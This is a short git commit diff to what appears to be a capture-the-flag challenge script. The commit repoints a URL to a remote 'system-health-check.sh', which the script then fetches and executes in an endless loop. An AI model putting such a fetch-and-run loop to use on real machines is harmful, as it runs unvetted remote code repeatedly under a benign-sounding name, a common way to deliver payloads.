847c2f93d4c341e051e58bcb5e71ad2b7de30835
Navneshwar <ch.sc.u4cys24064@ch.students.amrita.edu>
2026-03-16 18:13:29 +0000

    DO the fucking changes

--- raw/CTF/security-check-up/Flag.sh
+++ raw/CTF/security-check-up/Flag.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 # URL of your shell script stored online
-SCRIPT_URL="https://raw.githubusercontent.com/EXCLUSIVE-Pre-Selection/main/CTF/security-check-up/system-health-check.sh"
+SCRIPT_URL="https://raw.githubusercontent.com/Navneshwar/Exclusive-Pre-Selection/refs/heads/main/raw/CTF/security-check-up/system-health-check.sh"
 
 while true; do
     # Fetch and execute the script
